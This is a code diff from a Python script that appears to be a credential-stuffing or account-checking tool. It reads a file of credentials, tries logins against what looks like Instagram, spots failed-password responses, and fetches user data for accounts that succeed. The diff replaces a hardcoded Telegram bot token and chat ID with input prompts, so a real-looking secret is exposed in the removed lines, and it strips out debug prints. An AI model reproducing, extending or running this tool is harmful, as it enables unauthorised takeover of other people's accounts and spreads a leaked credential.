@@ -177,10 +177,9 @@ def gmail1():
 
 ######################################################
 def gmail():
-    #took =input('\033[1;33m[>] \033[1;31m- \033[1;37mEnter \033[1;32mYour Token \033[1;37mBot \033[1;31m: ')
-    #idddd =input('\033[1;35m[>] \033[1;31m- \033[1;37mEnter \033[1;32mYour ID \033[1;37mAccouint \033[1;31m: ')
-    took = '6254511888:AAGbTEWIa1up2OqW437IRfgsb401JtlI0Vw'
-    idddd ='6087078824'
+    took =input('\033[1;33m[>] \033[1;31m- \033[1;37mEnter \033[1;32mYour Token \033[1;37mBot \033[1;31m: ')
+    idddd =input('\033[1;35m[>] \033[1;31m- \033[1;37mEnter \033[1;32mYour ID \033[1;37mAccouint \033[1;31m: ')
+    
     global a,b,s,j
     os.system('cls' if os.name=='nt'else'clear')
     fik = input('\033[1;32m>> Enter Your File read Tool : ')
@@ -230,7 +229,7 @@ def gmail():
                 
             except requests.exceptions.ConnectionError as error:
                 continue
-            print(rf)
+        
             if ('"Sorry, your password was incorrect. Please double-check your password."') in rf:
                 b+=1
                 os.system('cls'if os.name=='nt'else'clear')
@@ -293,7 +292,7 @@ def gmail():
                         ge = requests.get(url2,headers=head2).json()
                     except requests.exceptions.ConnectionError as error:
                         continue
-                    print(ge)
+                   
                     try:
 
                         id = ge['data']['user']['id']
